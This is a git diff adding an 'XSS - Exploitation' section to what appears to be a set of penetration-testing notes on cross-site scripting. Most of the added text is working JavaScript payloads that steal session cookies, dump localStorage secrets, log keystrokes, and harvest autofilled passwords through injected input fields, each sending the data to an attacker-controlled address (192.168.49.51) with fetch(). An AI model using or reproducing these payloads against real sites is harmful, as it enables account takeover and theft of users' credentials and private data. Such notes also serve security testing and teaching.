@@ -15,3 +15,66 @@ XSS Payloads for fun and profit. Different types of XSS:
  - **Reflected Client XSS:** Same kind of idea as the Server XSS. Stuff some junk into a parameter and see what sticks.
 	 - `<img src='x' onerror='alert(1)'>`
  - **Stored Client XSS:** Things like form elements can be taken advantage of to store XSS, for example a survey page for Jarrod has the URL `http://survey.tld/?name=Jarrod` and after filling the survey we end up with a new parameter `http://survey.tdl/?name=Jarrod&result`. The answers to the survey could be prone to injection, and should be tested.
+
+## XSS - Exploitation
+
+### Stealing session cookies
+
+Leverage XSS to fetch the payload from a web server you control:
+
+```javascript
+let cookie = document.cookie
+
+let encodedCookie = encodeURIComponent(cookie)
+
+fetch("http://192.168.49.51/exfil?data=" + encodedCookie)
+```
+
+This payload may not work if `HttpOnly` is specified in the server headers.
+
+### Stealing local secrets
+
+Local storage may include secrets like API keys or personal user info. There are two types: `sessionStorage` and `localStorage` - session storage only holds data for the session, whereas `localStorage` is the local cache and won't be flushed until explicitly done so.
+
+```javascript
+let data = JSON.stringify(localStorage)
+
+let encodedData = encodeURIComponent(data)
+
+fetch("http://192.168.49.51/exfil?data=" + encodedData)
+```
+
+### Keylogging
+
+It's keylogging, but through XSS. Let's see what users are typing:
+
+```javascript
+function logKey(event){
+        fetch("http://192.168.49.51/k?key=" + event.key)
+}
+
+document.addEventListener('keydown', logKey);
+```
+
+### Stealing saved passwords
+
+```javascript
+let body = document.getElementsByTagName("body")[0]
+
+  var u = document.createElement("input");
+  u.type = "text";
+  u.style.position = "fixed";
+  //u.style.opacity = "0";
+
+  var p = document.createElement("input");
+  p.type = "password";
+  p.style.position = "fixed";
+  //p.style.opacity = "0";
+
+  body.append(u)
+  body.append(p)
+
+  setTimeout(function(){ 
+          fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
+   }, 5000);
+```
